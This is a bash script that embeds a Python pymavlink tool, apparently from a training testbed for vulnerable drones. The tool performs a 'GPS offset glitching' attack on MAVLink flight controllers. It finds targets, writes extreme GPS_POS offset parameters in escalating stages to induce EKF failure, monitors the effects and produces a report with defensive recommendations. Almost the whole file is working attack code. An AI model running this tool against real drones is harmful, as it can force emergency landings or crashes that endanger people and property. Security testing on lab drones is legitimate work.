#!/bin/bash
# gps_offset_attack.sh - GPS 오프셋 글리칭 공격 도구
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/gps_offset_attack.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="GPS Offset Glitching Attack"
LOG_FILE="$(get_log_dir)/gps_offset_attack.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║       GPS Offset Glitching Attack     ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("python3" "pip3")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            exit 1
        fi
    done
    
    # Python 라이브러리 확인 및 설치
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing pymavlink..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    log_success "Prerequisites check completed"
}

detect_mavlink_targets() {
    log_info "Detecting MAVLink targets..."
    
    local targets=()
    local network_mode=""
    
    # 네트워크 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_mode="wifi"
        targets+=("192.168.13.1:5760" "192.168.13.14:14550")
        log_info "WiFi mode detected"
    elif ip addr show | grep -q "10.13.0"; then
        network_mode="docker"
        targets+=("10.13.0.3:5760" "10.13.0.4:14550")
        log_info "Docker bridge mode detected"
    else
        network_mode="generic"
        targets+=("127.0.0.1:5760" "127.0.0.1:14550")
        log_warning "Generic network mode, using localhost targets"
    fi
    
    echo -e "${CYAN}Potential MAVLink targets:${NC}"
    for target in "${targets[@]}"; do
        echo "  └─ $target"
    done
    
    echo "$network_mode:${targets[*]}"
}

test_mavlink_connectivity() {
    local target="$1"
    
    log_info "Testing connectivity to $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    # 포트 연결 테스트
    if timeout 5 bash -c "</dev/tcp/$ip/$port" 2>/dev/null; then
        log_success "Connection to $target successful"
        return 0
    else
        log_warning "Connection to $target failed"
        return 1
    fi
}

create_gps_offset_script() {
    local script_path="/tmp/gps_offset_attack.py"
    
    cat > "$script_path" << 'EOF'
#!/usr/bin/env python3
"""
GPS 오프셋 글리칭 공격 스크립트
"""

import sys
import time
import struct
from pymavlink import mavutil

class GPSOffsetAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.master = None
        self.connect()
    
    def connect(self):
        """드론에 연결"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
            self.master.wait_heartbeat(timeout=10)
            print(f"[+] Connected to drone at {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def set_gps_position_offset(self, param_name, offset_value):
        """GPS 위치 오프셋 설정"""
        try:
            self.master.mav.param_set_send(
                self.master.target_system,
                self.master.target_component,
                param_name.encode('utf-8'),
                offset_value,
                mavutil.mavlink.MAV_PARAM_TYPE_REAL32
            )
            print(f"[+] {param_name} set to {offset_value}")
            return True
        except Exception as e:
            print(f"[-] Failed to set {param_name}: {e}")
            return False
    
    def get_current_gps_params(self):
        """현재 GPS 파라미터 읽기"""
        print("[*] Reading current GPS parameters...")
        
        gps_params = [
            'GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z',
            'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z'
        ]
        
        current_values = {}
        
        for param in gps_params:
            try:
                self.master.mav.param_request_read_send(
                    self.master.target_system,
                    self.master.target_component,
                    param.encode('utf-8'),
                    -1
                )
                
                # 응답 대기
                msg = self.master.recv_match(type='PARAM_VALUE', blocking=True, timeout=5)
                if msg and msg.param_id.decode('utf-8').strip('\x00') == param:
                    current_values[param] = msg.param_value
                    print(f"[*] {param}: {msg.param_value}")
                else:
                    current_values[param] = 0.0
                    print(f"[*] {param}: Not available")
                    
            except Exception as e:
                print(f"[-] Failed to read {param}: {e}")
                current_values[param] = 0.0
        
        return current_values
    
    def apply_maximum_offsets(self):
        """최대 GPS 오프셋 적용"""
        print("[*] Applying maximum GPS offsets...")
        
        # 극단적인 오프셋 값들 (미터 단위)
        max_offsets = {
            'GPS_POS1_X': 1000.0,   # 1km 오프셋
            'GPS_POS1_Y': 1000.0,   # 1km 오프셋
            'GPS_POS1_Z': 100.0,    # 100m 고도 오프셋
            'GPS_POS2_X': -1000.0,  # 반대 방향 오프셋
            'GPS_POS2_Y': -1000.0,  # 반대 방향 오프셋
            'GPS_POS2_Z': -100.0    # 반대 방향 고도 오프셋
        }
        
        success_count = 0
        
        for param, offset in max_offsets.items():
            if self.set_gps_position_offset(param, offset):
                success_count += 1
            time.sleep(1)
        
        print(f"[+] Applied {success_count}/{len(max_offsets)} GPS offsets")
        return success_count == len(max_offsets)
    
    def apply_random_offsets(self, max_offset=500.0):
        """랜덤 GPS 오프셋 적용"""
        import random
        
        print(f"[*] Applying random GPS offsets (max: {max_offset}m)...")
        
        gps_params = [
            'GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z',
            'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z'
        ]
        
        applied_offsets = {}
        success_count = 0
        
        for param in gps_params:
            # 랜덤 오프셋 생성 (-max_offset ~ +max_offset)
            offset = random.uniform(-max_offset, max_offset)
            
            # Z축(고도)는 더 작은 범위로 제한
            if 'Z' in param:
                offset = random.uniform(-50.0, 50.0)
            
            if self.set_gps_position_offset(param, offset):
                applied_offsets[param] = offset
                success_count += 1
            
            time.sleep(1)
        
        print(f"[+] Applied {success_count}/{len(gps_params)} random offsets")
        return applied_offsets
    
    def induce_ekf_failure(self):
        """EKF 실패 유도"""
        print("[*] Attempting to induce EKF failure...")
        
        # 단계적으로 오프셋 증가
        offset_stages = [10.0, 50.0, 100.0, 500.0, 1000.0]
        
        for stage, offset in enumerate(offset_stages):
            print(f"[*] Stage {stage + 1}: Applying {offset}m offsets")
            
            # 모든 GPS 위치에 동일한 오프셋 적용
            gps_params = ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS2_X', 'GPS_POS2_Y']
            
            for param in gps_params:
                self.set_gps_position_offset(param, offset)
                time.sleep(0.5)
            
            # EKF 상태 모니터링
            print("[*] Monitoring EKF status...")
            self.monitor_ekf_status(10)
            
            time.sleep(2)
        
        print("[+] EKF failure induction completed")
    
    def monitor_ekf_status(self, duration=30):
        """EKF 상태 모니터링"""
        print(f"[*] Monitoring EKF status for {duration} seconds...")
        
        start_time = time.time()
        ekf_events = []
        gps_events = []
        
        while time.time() - start_time < duration:
            try:
                msg = self.master.recv_match(blocking=False, timeout=1)
                if msg:
                    msg_type = msg.get_type()
                    
                    # EKF 관련 메시지
                    if msg_type == 'EKF_STATUS_REPORT':
                        ekf_events.append({
                            'timestamp': time.time(),
                            'velocity_variance': msg.velocity_variance,
                            'pos_horiz_variance': msg.pos_horiz_variance,
                            'pos_vert_variance': msg.pos_vert_variance,
                            'compass_variance': msg.compass_variance,
                            'terrain_alt_variance': msg.terrain_alt_variance
                        })
                        print(f"[*] EKF Status - Pos Variance: {msg.pos_horiz_variance:.3f}")
                    
                    # GPS 관련 메시지
                    elif msg_type == 'GPS_RAW_INT':
                        gps_events.append({
                            'timestamp': time.time(),
                            'fix_type': msg.fix_type,
                            'satellites_visible': msg.satellites_visible,
                            'eph': msg.eph,
                            'epv': msg.epv
                        })
                        
                        if msg.fix_type < 3:  # GPS fix 손실
                            print(f"[!] GPS fix degraded: type {msg.fix_type}")
                    
                    # 상태 텍스트 메시지
                    elif msg_type == 'STATUSTEXT':
                        text = msg.text.decode('utf-8', errors='ignore')
                        if any(keyword in text.lower() for keyword in ['ekf', 'gps', 'failsafe', 'error']):
                            print(f"[!] Status: {text}")
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        print(f"[+] Monitoring completed. EKF events: {len(ekf_events)}, GPS events: {len(gps_events)}")
        return ekf_events, gps_events
    
    def restore_gps_offsets(self):
        """GPS 오프셋 복구 (0으로 설정)"""
        print("[*] Restoring GPS offsets to zero...")
        
        gps_params = [
            'GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z',
            'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z'
        ]
        
        success_count = 0
        
        for param in gps_params:
            if self.set_gps_position_offset(param, 0.0):
                success_count += 1
            time.sleep(1)
        
        print(f"[+] Restored {success_count}/{len(gps_params)} GPS parameters")
        return success_count == len(gps_params)
    
    def comprehensive_gps_attack(self):
        """종합적인 GPS 공격"""
        print("[*] Starting comprehensive GPS offset attack...")
        
        # 1. 현재 상태 확인
        original_params = self.get_current_gps_params()
        
        # 2. 최대 오프셋 적용
        print("\n[*] Phase 1: Maximum offsets")
        self.apply_maximum_offsets()
        self.monitor_ekf_status(15)
        
        # 3. 랜덤 오프셋 적용
        print("\n[*] Phase 2: Random offsets")
        random_offsets = self.apply_random_offsets(750.0)
        self.monitor_ekf_status(15)
        
        # 4. EKF 실패 유도
        print("\n[*] Phase 3: EKF failure induction")
        self.induce_ekf_failure()
        
        # 5. 복구 (선택사항)
        print("\n[*] Phase 4: Recovery")
        time.sleep(5)
        self.restore_gps_offsets()
        
        print("[+] Comprehensive GPS attack completed")
        return True

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 gps_offset_attack.py <ip> <port> <action>")
        print("Actions:")
        print("  read         - Read current GPS parameters")
        print("  maximum      - Apply maximum offsets")
        print("  random       - Apply random offsets")
        print("  ekf_failure  - Induce EKF failure")
        print("  comprehensive- Full attack sequence")
        print("  restore      - Restore offsets to zero")
        print("  monitor      - Monitor EKF status")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    action = sys.argv[3]
    
    # 공격 객체 생성
    attack = GPSOffsetAttack(target_ip, target_port)
    
    if not attack.master:
        print("[-] Failed to connect to target")
        sys.exit(1)
    
    # 액션 실행
    if action == "read":
        attack.get_current_gps_params()
    elif action == "maximum":
        attack.apply_maximum_offsets()
    elif action == "random":
        attack.apply_random_offsets()
    elif action == "ekf_failure":
        attack.induce_ekf_failure()
    elif action == "comprehensive":
        attack.comprehensive_gps_attack()
    elif action == "restore":
        attack.restore_gps_offsets()
    elif action == "monitor":
        attack.monitor_ekf_status(60)
    else:
        print(f"[-] Unknown action: {action}")

if __name__ == "__main__":
    main()
EOF

    chmod +x "$script_path"
    echo "$script_path"
}

execute_gps_offset_attack() {
    local target="$1"
    local attack_type="$2"
    
    log_info "Executing GPS offset attack against $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_gps_offset_script)
    
    echo -e "${YELLOW}[*] Target: $target${NC}"
    echo -e "${YELLOW}[*] Attack Type: $attack_type${NC}"
    echo -e "${CYAN}[*] Executing attack...${NC}"
    
    local attack_output=""
    local success=false
    
    case "$attack_type" in
        "maximum")
            echo -e "${RED}[!] Applying maximum GPS offsets${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "maximum" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "random")
            echo -e "${RED}[!] Applying random GPS offsets${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "random" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "ekf_failure")
            echo -e "${RED}[!] Inducing EKF failure${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "ekf_failure" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "comprehensive")
            echo -e "${RED}[!] Comprehensive GPS attack${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "comprehensive" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
    esac
    
    echo "$attack_output"
    
    if $success; then
        log_success "GPS offset attack executed successfully"
    else
        log_warning "GPS offset attack may have failed"
    fi
    
    rm -f "$script_path"
    
    echo "$success:$attack_output"
}

read_gps_parameters() {
    local target="$1"
    
    log_info "Reading current GPS parameters..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_gps_offset_script)
    
    echo -e "${CYAN}Reading GPS parameters from $target...${NC}"
    
    local param_output=$(python3 "$script_path" "$ip" "$port" "read" 2>&1)
    
    echo "$param_output"
    
    # 파라미터 값 추출
    local param_count=$(echo "$param_output" | grep "GPS_POS" | wc -l)
    
    echo -e "${GREEN}=== GPS Parameter Summary ===${NC}"
    echo "  └─ Parameters read: $param_count"
    
    if [[ $param_count -gt 0 ]]; then
        echo -e "${CYAN}Current GPS Position Offsets:${NC}"
        echo "$param_output" | grep "GPS_POS" | while read line; do
            echo "  └─ $line"
        done
    else
        echo -e "${YELLOW}  └─ No GPS parameters available${NC}"
    fi
    
    rm -f "$script_path"
}

monitor_ekf_health() {
    local target="$1"
    local monitoring_duration="${2:-30}"
    
    log_info "Monitoring EKF health..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_gps_offset_script)
    
    echo -e "${YELLOW}[*] Monitoring EKF status for ${monitoring_duration} seconds...${NC}"
    
    local monitor_output=$(timeout "$monitoring_duration" python3 "$script_path" "$ip" "$port" "monitor" 2>&1)
    
    echo "$monitor_output"
    
    # EKF 이벤트 분석
    local ekf_events=$(echo "$monitor_output" | grep "EKF Status" | wc -l)
    local gps_fixes=$(echo "$monitor_output" | grep "GPS fix" | wc -l)
    local errors=$(echo "$monitor_output" | grep -i "error\|fail\|degraded" | wc -l)
    
    echo -e "${GREEN}=== EKF Monitoring Summary ===${NC}"
    echo "  └─ EKF status updates: $ekf_events"
    echo "  └─ GPS fix issues: $gps_fixes"
    echo "  └─ Error events: $errors"
    echo "  └─ Monitoring duration: ${monitoring_duration}s"
    
    if [[ $errors -gt 0 ]]; then
        echo -e "${RED}  └─ EKF degradation detected${NC}"
    else
        echo -e "${GREEN}  └─ EKF appears stable${NC}"
    fi
    
    rm -f "$script_path"
}

perform_escalating_attack() {
    local target="$1"
    
    log_info "Performing escalating GPS offset attack..."
    
    local attack_stages=(
        "read:Read current parameters"
        "random:Random offset injection"
        "maximum:Maximum offset application"
        "ekf_failure:EKF failure induction"
    )
    
    echo -e "${GREEN}=== Escalating GPS Offset Attack ===${NC}"
    
    local stage_results=()
    local successful_stages=0
    
    for stage in "${attack_stages[@]}"; do
        local attack_type=$(echo "$stage" | cut -d: -f1)
        local description=$(echo "$stage" | cut -d: -f2)
        
        echo -e "\n${CYAN}[*] Stage: $description${NC}"
        
        if [[ "$attack_type" == "read" ]]; then
            read_gps_parameters "$target"
            stage_results+=("$description:SUCCESS")
            ((successful_stages++))
        else
            local result=$(execute_gps_offset_attack "$target" "$attack_type")
            local success=$(echo "$result" | cut -d: -f1)
            
            if [[ "$success" == "true" ]]; then
                ((successful_stages++))
                stage_results+=("$description:SUCCESS")
                echo -e "${GREEN}  └─ Stage succeeded${NC}"
                
                # 단계별 EKF 모니터링
                echo -e "${YELLOW}  └─ Monitoring effects...${NC}"
                monitor_ekf_health "$target" 15
            else
                stage_results+=("$description:FAILED")
                echo -e "${RED}  └─ Stage failed${NC}"
            fi
        fi
        
        # 단계 간 대기
        sleep 5
    done
    
    echo -e "\n${GREEN}=== Escalation Summary ===${NC}"
    echo "  └─ Total stages: ${#attack_stages[@]}"
    echo "  └─ Successful stages: $successful_stages"
    echo "  └─ Success rate: $((successful_stages * 100 / ${#attack_stages[@]}))%"
    
    echo -e "\n${CYAN}Stage Details:${NC}"
    for result in "${stage_results[@]}"; do
        local desc=$(echo "$result" | cut -d: -f1)
        local status=$(echo "$result" | cut -d: -f2)
        
        if [[ "$status" == "SUCCESS" ]]; then
            echo "  └─ $desc: ${GREEN}$status${NC}"
        else
            echo "  └─ $desc: ${RED}$status${NC}"
        fi
    done
    
    echo "$successful_stages:${#attack_stages[@]}"
}

generate_gps_offset_report() {
    local target="$1"
    local attack_summary="$2"
    
    log_info "Generating GPS offset attack report..."
    
    local successful=$(echo "$attack_summary" | cut -d: -f1)
    local total=$(echo "$attack_summary" | cut -d: -f2)
    local success_rate=$((successful * 100 / total))
    
    local report_file="$(get_log_dir)/gps_offset_attack_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║      GPS Offset Glitching Attack  Report          ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Attack Type: GPS Offset Glitching
Target: $target
Success Rate: ${success_rate}% (${successful}/${total})

╔═══ ATTACK SUMMARY ═══╗

Target System: MAVLink Drone
Attack Vector: GPS Parameter Manipulation
Protocol: MAVLink (TCP)
Parameters Targeted:
  - GPS_POS1_X/Y/Z (Primary GPS offsets)
  - GPS_POS2_X/Y/Z (Secondary GPS offsets)

╔═══ ATTACK EXECUTION ═══╗

$(cat "$LOG_FILE" | grep -A 25 "Escalating GPS Offset Attack" | tail -25)

╔═══ EKF MONITORING ═══╗

$(cat "$LOG_FILE" | grep -A 10 "EKF Monitoring Summary" | tail -10)

╔═══ SECURITY IMPLICATIONS ═══╗

1. Navigation System Vulnerability
   - Unprotected GPS position parameters
   - Real-time parameter modification capability
   - EKF susceptible to position discrepancies

2. Flight Safety Impact
   - Position estimation corruption
   - EKF failsafe triggering
   - Emergency landing scenarios

3. Operational Consequences
   - Navigation system failure
   - Mission abort conditions
   - Potential crash scenarios

╔═══ ATTACK MECHANISMS ═══╗

1. Parameter Injection
   - Direct GPS offset manipulation
   - Coordinate system corruption
   - Position reference frame attacks

2. EKF Disruption
   - Sensor fusion interference
   - Kalman filter destabilization
   - State estimation corruption

3. Failsafe Triggering
   - GPS glitch detection
   - Automatic landing activation
   - Mission termination

╔═══ EXPLOITATION SCENARIOS ═══╗

1. Mission Disruption
   - Force emergency landing
   - Prevent autonomous navigation
   - Disrupt waypoint following

2. Position Manipulation
   - False position reporting
   - Navigation system confusion
   - Coordinate frame attacks

3. Safety System Exploitation
   - EKF failsafe activation
   - GPS-denied operations
   - Backup system engagement

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 파라미터 보안
   - GPS 파라미터 쓰기 보호
   - 실시간 파라미터 검증
   - 파라미터 변경 로깅

2. 센서 융합 강화
   - 다중 GPS 시스템 활용
   - IMU 기반 백업 항법
   - 이상치 탐지 알고리즘

3. 시스템 모니터링
   - EKF 상태 실시간 감시
   - GPS 신호 품질 검증
   - 위치 정확도 검사

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up temporary files..."
    rm -f /tmp/gps_offset_attack.py 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting GPS offset glitching attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # MAVLink 타겟 탐지
    local target_info=$(detect_mavlink_targets)
    local network_mode=$(echo "$target_info" | cut -d: -f1)
    local targets=($(echo "$target_info" | cut -d: -f2-))
    
    # 연결 가능한 타겟 찾기
    local active_target=""
    for target in "${targets[@]}"; do
        if test_mavlink_connectivity "$target"; then
            active_target="$target"
            break
        fi
    done
    
    if [[ -z "$active_target" ]]; then
        log_error "No active MAVLink targets found"
        exit 1
    fi
    
    echo -e "\n${BLUE}[*] Active target: $active_target${NC}"
    
    # GPS 파라미터 읽기
    echo -e "\n${BLUE}[*] Reading current GPS parameters...${NC}"
    read_gps_parameters "$active_target" | tee -a "$LOG_FILE"
    
    # 단계별 공격 실행
    echo -e "\n${BLUE}[*] Executing escalating attack...${NC}"
    local attack_summary=$(perform_escalating_attack "$active_target")
    
    # 최종 EKF 상태 모니터링
    echo -e "\n${BLUE}[*] Final EKF health monitoring...${NC}"
    monitor_ekf_health "$active_target" 30 | tee -a "$LOG_FILE"
    
    # 보고서 생성
    generate_gps_offset_report "$active_target" "$attack_summary"
    
    cleanup
    
    log_success "GPS offset glitching attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"